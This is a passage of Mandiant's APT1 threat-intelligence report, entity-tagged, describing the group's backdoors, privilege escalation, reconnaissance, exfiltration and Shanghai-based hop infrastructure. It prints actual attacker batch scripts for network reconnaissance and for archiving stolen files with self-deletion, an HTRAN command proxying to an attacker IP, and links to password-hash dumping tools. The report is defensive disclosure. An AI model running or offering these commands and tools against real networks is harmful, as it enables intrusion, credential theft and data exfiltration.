<MALWARE>GLOOXMAIL</MALWARE>
<MALWARE>MINIASP</MALWARE>
<MALWARE>BOUNCER</MALWARE>
<MALWARE>WEBC2.TABLE</MALWARE>
<MALWARE>WEBC2.BOLIDKURTON</MALWARE>
<MALWARE>CALENDAR</MALWARE>
<MALWARE>GDOCUPLOAD</MALWARE>
<MALWARE>LIGHTBOLT</MALWARE>
<MALWARE>WEBC2.Y21K</MALWARE>
<MALWARE>WEBC2.KT32004</MALWARE>
<MALWARE>LIGHTDART</MALWARE>

<TIMESTAMP>2005</TIMESTAMP>

<TIMESTAMP>2006</TIMESTAMP>

<MALWARE>MAPIGET</MALWARE>
<MALWARE>BISCUIT</MALWARE>
<MALWARE>MANITSMEWEBC2.UGX</MALWARE>
<MALWARE>STARSYPOUNDTARSIP</MALWARE>
<MALWARE>DAIRY</MALWARE>
<MALWARE>SWORD</MALWARE>
<MALWARE>HELAUTO</MALWARE>
<MALWARE>WEBC2.AUSOVHACKSFASE</MALWARE>
<MALWARE>AURIGA</MALWARE>
<MALWARE>WEBC2.CLOVERGREENCAT</MALWARE>
<MALWARE>MACROMAILGOGGLES</MALWARE>
<MALWARE>NEWSREELSWEBC2.RAVE</MALWARE>
<MALWARE>WEBC2.ADSPACE</MALWARE>
<MALWARE>WEBC2.HEAD</MALWARE>
<MALWARE>BANGAT</MALWARE>

<THREAT_ACTOR>APT 1</THREAT_ACTOR> MALWARE FAMILIES

<MALWARE>GETMAIL</MALWARE>

FIRST KNOWN COMPILE TIMES



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 33 www.mandiant.com

The <MALWARE>BISCUIT</MALWARE> backdoor (so named for the command “bdkzt”) is an illustrative example of the range of commands that 
<THREAT_ACTOR>APT1</THREAT_ACTOR> has built into its “standard” backdoors. <THREAT_ACTOR>APT1</THREAT_ACTOR> has used and steadily modified <MALWARE>BISCUIT</MALWARE> since as early as <TIMESTAMP>2007</TIMESTAMP>
and continues to use it presently. 

taBLe 4: a subset of <MALWARE>BISCUIT</MALWARE> commands

Command Description
bdkzt Launch a command shell

ckzjqk Get system information

download <file> Transfer a file from the C2 server

exe <file> <user> Launch a program as a specific user

exit Close the connection and sleep

lists <type> List servers on a Windows network. 

ljc Enumerate running processes and identify their owners.

sjc <PID>|<NAME> Terminate a process, either by process ID or by process name.

upload <file> Send a file to the C2 server

zxdosml <input> Send input to the command shell process (launched with “bdkzt”).

These functions are characteristic of most backdoors, and are not limited to <THREAT_ACTOR>APT1</THREAT_ACTOR> or even <THREAT_ACTOR>APT</THREAT_ACTOR>. For example, anyone 
who wants to control a system remotely will likely put functions like “Upload/download files” into a backdoor.

Covert Communications
Some <THREAT_ACTOR>APT</THREAT_ACTOR> backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol. <THREAT_ACTOR>APT1</THREAT_ACTOR> has created a 
handful of these, including:

taBLe 5: Backdoors that mimic legitimate communication protocols

Backdoor  Mimicked protocol

<MALWARE>MaCroMaIL</MALWARE>  <SOFTWARE>MSN Messenger</SOFTWARE>

<MALWARE>GLooxMaIL</MALWARE>  <SOFTWARE>Jabber/XMPP</SOFTWARE>

<MALWARE>CaLenDar</MALWARE>  <SOFTWARE>Gmail Calendar</SOFTWARE>

When network defenders see the communications between these backdoors and their C2 servers, they might easily 
dismiss them as legitimate network traffic. Additionally, many of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s backdoors use SSL encryption so that 
communications are hidden in an encrypted SSL tunnel. We have provided <THREAT_ACTOR>APT1</THREAT_ACTOR>’s public SSL certificates in Appendix 
F so people can incorporate them into their network signatures.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 34 www.mandiant.com

Privilege Escalation

Escalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more 
resources within the network. In this and the next two stages, <THREAT_ACTOR>APT1</THREAT_ACTOR> does not differ significantly from other <THREAT_ACTOR>APT</THREAT_ACTOR> 
intruders (or intruders, generally). <THREAT_ACTOR>APT1</THREAT_ACTOR> predominantly uses publicly available tools to dump password hashes from 
victim systems in order to obtain legitimate user credentials.

<THREAT_ACTOR>APT1</THREAT_ACTOR> has used these privilege escalation tools:

taBLe 6: Publicly available privilege escalation tools that <THREAT_ACTOR>APT1</THREAT_ACTOR> has used

tool Description  website

<TOOL>cachedump</TOOL> This program extracts cached 
password hashes from a system’s 
registry 

 Currently packaged with fgdump (below)

<TOOL>fgdump</TOOL> Windows password hash dumper  http://www.foofus.net/fizzgig/fgdump/

<TOOL>gsecdump</TOOL> Obtains password hashes from the 
Windows registry, including the SAM 
file, cached domain credentials, and 
LSA secrets 

 http://www.truesec.se

<TOOL>lslsass</TOOL> Dump active logon session password 
hashes from the lsass process 

 http://www.truesec.se

<TOOL>mimikatz</TOOL> A utility primarily used for dumping 
password hashes 

 http://blog.gentilkiwi.com/mimikatz

<TECHNIQUE>pass-the-hash</TECHNIQUE> toolkit

Allows an intruder to “pass” a 
password hash (without knowing the 
original password) to log in to systems 

 http://oss.coresecurity.com/projects/pshtoolkit.htm

<TOOL>pwdump7</TOOL> Dumps password hashes from the 
Windows registry 

 http://www.tarasco.org/security/pwdump_7/

<TOOL>pwdumpx</TOOL> Dumps password hashes from the 
Windows registry 

The tool claims its origin as http://reedarvin.thearvins.com/, 
but the site is not offering this software as of the date of this 
report 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 35 www.mandiant.com

Internal Reconnaissance

In the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most <THREAT_ACTOR>APT</THREAT_ACTOR> 
(and non-APT) intruders, <THREAT_ACTOR>APT1</THREAT_ACTOR> primarily uses built-in operating system commands to explore a compromised system 
and its networked environment. Although they usually simply type these commands into a command shell, sometimes 
intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that 
<THREAT_ACTOR>APT1</THREAT_ACTOR> used on at least four victim networks.

@echo off
ipconfig /all>>”C:\WINNT\Debug\1.txt”
net start>>”C:\WINNT\Debug\1.txt”
tasklist /v>>”C:\WINNT\Debug\1.txt”
net user >>”C:\WINNT\Debug\1.txt”
net localgroup administrators>>”C:\WINNT\Debug\1.txt”
netstat -ano>>”C:\WINNT\Debug\1.txt”
net use>>”C:\WINNT\Debug\1.txt”
net view>>”C:\WINNT\Debug\1.txt”
net view /domain>>”C:\WINNT\Debug\1.txt”
net group /domain>>”C:\WINNT\Debug\1.txt”
net group “domain users” /domain>>”C:\WINNT\Debug\1.txt”
net group “domain admins” /domain>>”C:\WINNT\Debug\1.txt”
net group “domain controllers” /domain>>”C:\WINNT\Debug\1.txt”
net group “exchange domain servers” /domain>>”C:\WINNT\Debug\1.txt”
net group “exchange servers” /domain>>”C:\WINNT\Debug\1.txt”
net group “domain computers” /domain>>”C:\WINNT\Debug\1.txt”

FIGure 18: an <THREAT_ACTOR>APT1</THREAT_ACTOR> batch script that automates reconnaissance

what is a password hash?
When a person logs in to a computer, website, email server, or any networked resource requiring a password, 
the supplied password needs to be verified. One way to do this would be to store the person’s actual password 
on the system that the person is trying to access, and to compare the typed password to the stored password. 
Although simple, this method is also very insecure: anyone who can access that same system will be able to 
see the person’s password. Instead, systems that verify passwords usually store password hashes. In simple 
terms, a password hash is a number that is mathematically generated from the person’s password. The 
mathematical methods (algorithms) used to generate password hashes will create values that are unique for 
all practical purposes. When a person supplies their password, the computer generates a hash of the typed 
password and compares it to the stored hash. If they match, the passwords are presumed to be the same and 
the person is allowed to log in.

It is supposed to be impossible to “reverse” a hash to obtain the original password. However, it is possible with 
enough computational resources to “crack” password hashes to discover the original password. (“Cracking” 
generally consists of guessing a large number of passwords, hashing them, and comparing the generated 
hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems 
in hopes that they can either use the hashes as-is (by “passing-the-hash”) or crack them to discover users’ 
passwords.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 36 www.mandiant.com

This script performs the following functions and saves the results to a text file:

»» Display the victim’s network configuration information

»» List the services that have started on the victim system

»» List currently running processes

»» List accounts on the system

»» List accounts with administrator privileges

»» List current network connections

»» List currently connected network shares

»» List other systems on the network

»» List network computers and accounts according to group (“domain controllers,” “domain users,” “domain 
admins,” etc.)

Lateral Movement

Once an <THREAT_ACTOR>APT</THREAT_ACTOR> intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder 
to move around the network undetected:

»» They can connect to shared resources on other systems

»» They can execute commands on other systems using the publicly available “<TOOL>psexec</TOOL>” tool from <ORG>Microsoft</ORG> 
Sysinternals or the built-in Windows Task Scheduler (“at.exe”)

These actions are hard to detect because legitimate system administrators also use these techniques to perform 
actions around the network.

Maintain Presence

In this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network 
environment from outside of the network. <THREAT_ACTOR>APT1</THREAT_ACTOR> does this in three ways.

1. Install new backdoors on multiple systems
Throughout their stay in the network (which could be years), <THREAT_ACTOR>APT1</THREAT_ACTOR> usually installs new backdoors as they claim more 
systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can 
use. We usually detect multiple families of <THREAT_ACTOR>APT1</THREAT_ACTOR> backdoors scattered around a victim network when <THREAT_ACTOR>APT1</THREAT_ACTOR> has been 
present for more than a few weeks.

2. use legitimate vPn credentials
<THREAT_ACTOR>APT</THREAT_ACTOR> actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user. 
We have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> using stolen usernames and passwords to log into victim networks’ VPNs when the VPNs are 
only protected by single-factor authentication. From there they are able to access whatever the impersonated users are 
allowed to access within the network.

36 <ORG>Mandiant</ORG> uses the term “credentials” to refer to a userid and its corresponding, working password.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 37 www.mandiant.com

3. Log in to web portals
Once armed with stolen credentials, <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders also attempt to log into web portals that the network offers. This 
includes not only restricted websites, but also web-based email systems such as Outlook Web Access.

Completing The Mission

Similar to other <THREAT_ACTOR>APT</THREAT_ACTOR> groups we track, once <THREAT_ACTOR>APT1</THREAT_ACTOR> finds files of interest they pack them into archive files before stealing 
them. <THREAT_ACTOR>APT</THREAT_ACTOR> intruders most commonly use the RAR archiving utility for this task and ensure that the archives are 
password protected. Sometimes <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders use batch scripts to assist them in the process, as depicted in Figure 
19. (The instances of “XXXXXXXX” obfuscate the text that was in the actual batch script.)

@echo off
cd /d c:\windows\tasks
rar.log a XXXXXXXX.rar -v200m “C:\Documents and Settings\Place\My 
Documents\XXXXXXXX” -hpsmy123!@#
del *.vbs
del %0

FIGure 19: an <THREAT_ACTOR>APT1</THREAT_ACTOR> batch script that bundles stolen files into rar archive files

After creating files compressed via RAR, the <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers will transfer files out of the network in ways that are 
consistent with other <THREAT_ACTOR>APT</THREAT_ACTOR> groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many 
times their RAR files are so large that the attacker splits them into chunks before transferring them. Figure 19 above 
shows a RAR command with the option “-v200m”, which means that the RAR file should be split up into 200MB 
portions.

.rar

FIGure 20: <THREAT_ACTOR>APT1</THREAT_ACTOR> bundles stolen files into rar archives before moving data to <COUNTRY>China</COUNTRY>



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 38 www.mandiant.com

Unlike most other <THREAT_ACTOR>APT</THREAT_ACTOR> groups we track, <THREAT_ACTOR>APT1</THREAT_ACTOR> uses two email-stealing utilities that we believe are unique to <THREAT_ACTOR>APT1</THREAT_ACTOR>. The 
first, <MALWARE>GETMAIL</MALWARE>, was designed specifically to extract email messages, attachments, and folders from within <SOFTWARE>Microsoft Outlook</SOFTWARE> archive (“PST”) files. 

<SOFTWARE>Microsoft Outlook</SOFTWARE> archives can be large, often storing years’ worth of emails. They may be too large to transfer out 
of a network quickly, and the intruder may not be concerned about stealing every email. The <MALWARE>GETMAIL</MALWARE> utility allows 
<THREAT_ACTOR>APT1</THREAT_ACTOR> intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an <THREAT_ACTOR>APT1</THREAT_ACTOR> 
intruder return to a compromised system once a week for four weeks in a row to steal only the past week’s emails.

Whereas <MALWARE>GETMAIL</MALWARE> steals email in Outlook archive files, the second utility, <MALWARE>MAPIGET</MALWARE>, was designed specifically to steal 
email that has not yet been archived and still resides on a <SOFTWARE>Microsoft Exchange Server</SOFTWARE>. In order to operate successfully, 
<MALWARE>MAPIGET</MALWARE> requires username/password combinations that the Exchange server will accept. <MALWARE>MAPIGET</MALWARE> extracts email 
from specified accounts into text files (for the email body) and separate attachments, if there are any. 

english as a second Language
<THREAT_ACTOR>APT1</THREAT_ACTOR>’s “It’s legit” email should not mislead someone into thinking that <THREAT_ACTOR>APT1</THREAT_ACTOR> personnel are all fluent in English, though 
some undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose first 
language is not English. Here are some examples of grammatically incorrect phrases that have made it into <THREAT_ACTOR>APT1</THREAT_ACTOR>’s 
tools over the years.

taBLe 7: examples of grammatically incorrect phrases in <THREAT_ACTOR>APT1</THREAT_ACTOR> malware

Phrase tool Compile date

If use it, key is the KEY. <MALWARE>GETMAIL</MALWARE> <TIMESTAMP>2005-08-18</TIMESTAMP>

Wether encrypt or not,Default is NOT. <MALWARE>GETMAIL</MALWARE> <TIMESTAMP>2005-08-18</TIMESTAMP>

ToolHelp API isn’t support on NT versions prior to <SOFTWARE>Windows 2000</SOFTWARE>! <MALWARE>LIGHTDART</MALWARE> <TIMESTAMP>2006-08-03</TIMESTAMP>

No Doubt to Hack You, Writed by <IDENTITY>UglyGorilla</IDENTITY> <MALWARE>MANITSME</MALWARE> <TIMESTAMP>2007-09-06</TIMESTAMP>

Type command disable.Go on! <MALWARE>HELAUTO</MALWARE> <TIMESTAMP>2008-06-16</TIMESTAMP>

File no exist. Simple Downloader 
(not profiled) 

<TIMESTAMP>2008-11-26</TIMESTAMP>

you specify service name not in Svchost\netsvcs, must be one of following <MALWARE>BISCUIT</MALWARE> <TIMESTAMP>2009-06-02</TIMESTAMP>

Can not found the PID <MALWARE>WEBC2</MALWARE> (Uncat) <TIMESTAMP>2009-08-11</TIMESTAMP>

Doesn’t started! <MALWARE>GREENCAT</MALWARE> <TIMESTAMP>2009-08-18</TIMESTAMP>

Exception Catched <MALWARE>MACROMAIL</MALWARE> <TIMESTAMP>2010-03-15</TIMESTAMP>

Are you sure to FORMAT Disk C With NTFS?(Y/N) <MALWARE>TABMSGSQL</MALWARE> <TIMESTAMP>2010-11-04</TIMESTAMP>

Shell is not exist or stopped! <MALWARE>TARSIP</MALWARE> <TIMESTAMP>2011-03-24</TIMESTAMP>

Reqfile not exist! <MALWARE>COOKIEBAG</MALWARE> <TIMESTAMP>2011-10-12</TIMESTAMP>

the url no respon! <MALWARE>COOKIEBAG</MALWARE> <TIMESTAMP>2011-10-12</TIMESTAMP>

Fail To Execute The Command <MALWARE>WEBC2-TABLE</MALWARE> <TIMESTAMP>2012-02-23</TIMESTAMP>



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 39 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR>: InFrastruCture

<THREAT_ACTOR>APT1</THREAT_ACTOR> maintains an extensive infrastructure of computers around the world. We have evidence suggesting that <THREAT_ACTOR>APT1</THREAT_ACTOR> 
manually controls thousands of systems in support of their attacks, and have directly observed their control over 
hundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large 
networks in <CITY>Shanghai</CITY> — two of which are allocated directly to the Pudong New Area, the home of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. The 
sheer number of <THREAT_ACTOR>APT1</THREAT_ACTOR> IP addresses concentrated in these <CITY>Shanghai</CITY> ranges, coupled with Simplified Chinese keyboard 
layout settings on <THREAT_ACTOR>APT1</THREAT_ACTOR>’s attack systems, betrays the true location and language of the operators. To help manage the 
vast number of systems they control, <THREAT_ACTOR>APT1</THREAT_ACTOR> has registered hundreds of domain names, the majority of which also point 
to a <CITY>Shanghai</CITY> locale. The domain names and IP addresses together comprise <THREAT_ACTOR>APT1</THREAT_ACTOR>’s command and control framework 
which they manage in concert to camouflage their true origin from their English speaking targets.

<THREAT_ACTOR>APT1</THREAT_ACTOR> Network Origins

We are frequently asked why it is an ineffective security measure to just block all IP addresses in <COUNTRY>China</COUNTRY> from 
connecting to your network. To put it simply, it is easy for <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers to bounce or “hop” through intermediary 
systems such that they almost never connect to a victim network directly from their systems in <CITY>Shanghai</CITY>. Using their 
immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country 
they choose. The systems in this type of network redirection infrastructure have come to be called “hop points” 
or “hops.” Hop points are most frequently compromised systems that <THREAT_ACTOR>APT1</THREAT_ACTOR> uses, in some instances for years, as 
camouflage for their attacks without the knowledge of the systems’ owners. These systems belong to third-party victims 
who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data 
and intellectual property.

FIGure 21: <THREAT_ACTOR>APT1</THREAT_ACTOR> bounces through “hop point” systems before accessing victim systems



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 40 www.mandiant.com

We have observed some of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s activities after they cross into (virtual) <COUNTRY>U.S.</COUNTRY> territory. They access hop points using 
a variety of techniques, the most popular being <SOFTWARE>Remote Desktop</SOFTWARE> and FTP. <TIMESTAMP>Over a two-year period</TIMESTAMP> (<TIMESTAMP>January 2011 to January 2013</TIMESTAMP>) we confirmed 1,905 instances of <THREAT_ACTOR>APT1</THREAT_ACTOR> actors logging into their hop infrastructure from 832 different 
IP addresses with <SOFTWARE>Remote Desktop</SOFTWARE>. <SOFTWARE>Remote Desktop</SOFTWARE> provides a remote user with an interactive graphical interface to 
a system. The experience is similar to the user actually physically sitting at the system and having direct access to the 
desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four 
large net blocks in <CITY>Shanghai</CITY> which we will refer to as <THREAT_ACTOR>APT1</THREAT_ACTOR>’s home networks.

taBLe 8: net blocks corresponding to IP addresses that <THREAT_ACTOR>APT1</THREAT_ACTOR> used to access their hop points

number net block registered owner 

445 <IOC>223.166.0.0 - 223.167.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

217 <IOC>58.246.0.0 - 58.247.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

114 <IOC>112.64.0.0 - 112.65.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

12 <IOC>139.226.0.0 - 139.227.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

1 <IOC>114.80.0.0 - 114.95.255.255</IOC> <ORG>China Telecom</ORG> <CITY>Shanghai</CITY> Network 

1 <IOC>101.80.0.0 - 101.95.255.255</IOC> <ORG>China Telecom</ORG> <CITY>Shanghai</CITY> Network

27 Other (non-<CITY>Shanghai</CITY>) Chinese IPs  

Notably, the registration information for the second and third net blocks above includes this contact information at the 
end:

person: <IDENTITY>yanling ruan</IDENTITY>
nic-hdl:  YR194-AP
e-mail:  <IOC>sh-ipmaster@Chinaunicom.cn</IOC>
address:  No.900,Pudong Avenue,<CITY>Shanghai</CITY>,<COUNTRY>China</COUNTRY>
phone:  +086-021-61201616
fax-no:  +086-021-61201616
country:  <COUNTRY>cn</COUNTRY>

The registration information for these two net blocks suggests that they serve the Pudong New Area of <CITY>Shanghai</CITY>, where 
<THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR> is headquartered. 

The other 15 of the 832 IP addresses are registered to organizations in the <COUNTRY>U.S.</COUNTRY> (12), <COUNTRY>Taiwan</COUNTRY> (1), <COUNTRY>Japan</COUNTRY> (1) and <COUNTRY>Korea</COUNTRY> 
(1). We have confirmed that some of these systems are part of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s hop infrastructure and not legitimately owned 
by <THREAT_ACTOR>APT1</THREAT_ACTOR> — in other words, <THREAT_ACTOR>APT1</THREAT_ACTOR> accessed one hop from another hop, as opposed to accessing the hop directly from 
<CITY>Shanghai</CITY>.

In order to make a user’s experience as seamless as possible, the <SOFTWARE>Remote Desktop</SOFTWARE> protocol requires client applications 
to forward several important details to the server, including their client hostname and the client keyboard layout. 
In 1,849 of the 1,905 (97%) <THREAT_ACTOR>APT1</THREAT_ACTOR> <SOFTWARE>Remote Desktop</SOFTWARE> sessions we observed in the past two years, the keyboard 
layout setting was “Chinese (Simplified) — <COUNTRY>US</COUNTRY> Keyboard.” <SOFTWARE>Microsoft’s Remote Desktop</SOFTWARE> client configures this setting 
automatically based on the selected language on the client system, making it nearly certain that the <THREAT_ACTOR>APT1</THREAT_ACTOR> actors 
managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. “Simplified Chinese” is 
a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland 
<COUNTRY>China</COUNTRY>. <COUNTRY>Taiwan</COUNTRY> and municipalities such as <COUNTRY>Hong Kong</COUNTRY> still use “Traditional Chinese” (zh-tw) character sets.

The overwhelming concentration of <CITY>Shanghai</CITY> IP addresses and Simplified Chinese language settings clearly indicate 
that <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders are mainland Chinese speakers with ready access to large networks in <CITY>Shanghai</CITY>. The only 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 41 www.mandiant.com

alternative is that <THREAT_ACTOR>APT1</THREAT_ACTOR> has intentionally been conducting a years-long deception campaign to impersonate Chinese 
speakers from <CITY>Shanghai</CITY> in places where victims are not reasonably expected to have any visibility – and without 
making a single mistake that might indicate their “true” identity. 

Interaction with Backdoors

As we just mentioned, <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers typically use hops to connect to and control victim systems. Victim backdoors 
regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However, 
exactly how this works is often specific to the tools they are using. 

MANUAL <MALWARE>WEBC2</MALWARE> UPDATES

As covered in the previous “Attack Lifecycle” section, <MALWARE>WEBC2</MALWARE> backdoor variants download and interpret data stored 
between tags in HTML pages as commands. They usually download HTML pages from a system within <THREAT_ACTOR>APT1</THREAT_ACTOR>’s hop 
infrastructure. We have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders logging in to <MALWARE>WEBC2</MALWARE> servers and manually editing the HTML pages 
that backdoors will download. Because the commands are usually encoded and difficult to spell from memory, <THREAT_ACTOR>APT1</THREAT_ACTOR> 
intruders typically do not type these strings, but instead copy and paste them into the HTML files. They likely generate 
the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point. For 
example, we observed an <THREAT_ACTOR>APT</THREAT_ACTOR> attacker pasting the string “czo1NA==” into an HTML page. That string is the base64-
encoded version of “s:54”, meaning “sleep for 54 minutes” (or hours, depending on the particular backdoor). In lieu 
of manually editing an HTML file on a hop point, we have also observed <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders uploading new (already-edited) 
HTML files. 

<TOOL>HTRAN</TOOL>

When <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers are not using <MALWARE>WEBC2</MALWARE>, they require a “command and control” (C2) user interface so they can 
issue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically 
in <CITY>Shanghai</CITY>. In these instances, when a victim backdoor makes contact with a hop, the communications need to be 
forwarded from the hop to the intruder’s <CITY>Shanghai</CITY> system so the backdoor can talk to the C2 server software. We have 
observed 767 separate instances in which <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders used the publicly available “<TOOL>HUC Packet Transmit Tool</TOOL>” 
or <TOOL>HTRAN</TOOL> on a hop. As always, keep in mind that these uses are confirmed uses, and likely represent only a small 
fraction of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s total activity.

The <TOOL>HTRAN</TOOL> utility is merely a middle-man, facilitating connections between the victim and the attacker who is using 
the hop point.

0100100001 0100100001

01010100010101010001 C2HTRAN
FIGure 22: the <TOOL>HTRAN</TOOL> tool resides on <THREAT_ACTOR>APT1</THREAT_ACTOR> hop points and acts as a middle-man



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 42 www.mandiant.com

Typical use of <TOOL>HTRAN</TOOL> is fairly simple: the attacker must specify the originating IP address (of his or her workstation in 
<CITY>Shanghai</CITY>), and a port on which to accept connections. For example, the following command, which was issued by an 
<THREAT_ACTOR>APT1</THREAT_ACTOR> actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the <CITY>Shanghai</CITY> 
IP address <IOC>58.247.242.254</IOC> on port 443:

htran -tran 443 <IOC>58.247.242.254</IOC> 443

In the 767 observed uses of <TOOL>HTRAN</TOOL>, <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders supplied 614 distinct routable IP addresses. In other words, they 
used their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses, 
613 of 614 are part of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s home networks:

taBLe 9: net blocks corresponding to IP addresses used to receive <TOOL>HTRAN</TOOL> communications 

number net block registered owner

340 <IOC>223.166.0.0 - 223.167.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

160 <IOC>58.246.0.0 - 58.247.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

102 <IOC>112.64.0.0 - 112.65.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

11 <IOC>139.226.0.0 - 139.227.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

1 <IOC>143.89.0.0 - 143.89.255.255</IOC> <ORG>Hong Kong University of Science and Technology</ORG>

C2 SERVER SOFTWARE ON HOP INFRASTRUCTURE

Occasionally, <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers have installed C2 server components on systems in their hop infrastructure rather than 
forwarding connections back to C2 servers in <CITY>Shanghai</CITY>. In these instances they do not need to use a proxy tool like 
<TOOL>HTRAN</TOOL> to interact with victim systems. However, it does mean that the intruders need to be able to interface with the 
(often graphical) C2 server software running on the hop. We have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders log in to their hop point, 
start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems.

<MALWARE>WEBC2</MALWARE> variants may include a server component that provides a simple C2 interface to the intruder. This saves the 
intruder from having to manually edit webpages. That is, this server component receives connections from victim 
backdoors, displays them to the intruder, and then translates the intruder’s commands into HTML tags that the victim 
backdoors read.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 43 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR> Servers

In the last two years alone, we have confirmed 937 <THREAT_ACTOR>APT1</THREAT_ACTOR> C2 servers — that is, actively listening or communicating 
programs — running on 849 distinct IP addresses. However, we have evidence to suggest that <THREAT_ACTOR>APT1</THREAT_ACTOR> is running 
hundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as <THREAT_ACTOR>APT1</THREAT_ACTOR> 
servers have mainly been: (1) <TOOL>FTP</TOOL>, for transferring files; (2) <TOOL>web</TOOL>, primarily for <MALWARE>WEBC2</MALWARE>; (3) <TOOL>RDP</TOOL>, for remote graphical 
control of a system; (4) <TOOL>HTRAN</TOOL>, for proxying; and (5) C2 servers associated with various backdoor families (covered in 
Appendix C: The Malware Arsenal). 

<COUNTRY>China</COUNTRY> (709)

US (109)

<COUNTRY>South Korea</COUNTRY> (11) <COUNTRY>Taiwan</COUNTRY> (6)
<COUNTRY>Canada</COUNTRY> (3)
<COUNTRY>Australia</COUNTRY> (2)
<COUNTRY>Mexico</COUNTRY> (2)
<COUNTRY>Norway</COUNTRY> (2)
<COUNTRY>Belgium</COUNTRY> (1)
<COUNTRY>Denmark</COUNTRY> (1)
<COUNTRY>Indonesia</COUNTRY> (1)
<COUNTRY>India</COUNTRY> (1)
<COUNTRY>Singapore</COUNTRY> (1)

Global distribution of confirmed <THREAT_ACTOR>APT1</THREAT_ACTOR> servers

<IOC>223.166.0.0 - 223.167.255.255</IOC>: 406
(<CITY>Shanghai</CITY>)

<IOC>58.246.0.0 - 58.247.255.255</IOC>: 180
(<CITY>Shanghai</CITY>) 

<IOC>112.64.0.0 - 112.65.255.255</IOC>: 93
(<CITY>Shanghai</CITY>) 

<IOC>139.226.0.0 - 139.227.255.255</IOC>: 19
(<CITY>Shanghai</CITY>) Other: 11 (including 7 in <COUNTRY>Hong Kong</COUNTRY>)

Distribution of confirmed <THREAT_ACTOR>APT1</THREAT_ACTOR> servers in <COUNTRY>China</COUNTRY>

FIGure 23: the global distribution of confirmed <THREAT_ACTOR>APT1</THREAT_ACTOR> servers



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 44 www.mandiant.com

Domain Names

The Domain Name System (DNS) is the phone book of the Internet. In the same way that people program named 
contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember 
names like “google.com” instead of IP addresses. When a person types “google.com” into a web browser, a DNS 
translation to an IP address occurs so that the person’s computer can communicate with <ORG>Google</ORG>. Names that can be 
translated through DNS to IP addresses are referred to as Fully Qualified Domain Names (FQDNs).

0100100001 0100100001

01010100010101010001

<IOC>ug-co.hugesoft.org</IOC>

      1010010010100101

1001100100011010100                     

1001100100011               

DNS QUERY        

“Here’s the IP address”

C2

FIGure 24: Dns queries are used to resolve <THREAT_ACTOR>APT1</THREAT_ACTOR> FQDns to many C2 server IPs



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 45 www.mandiant.com

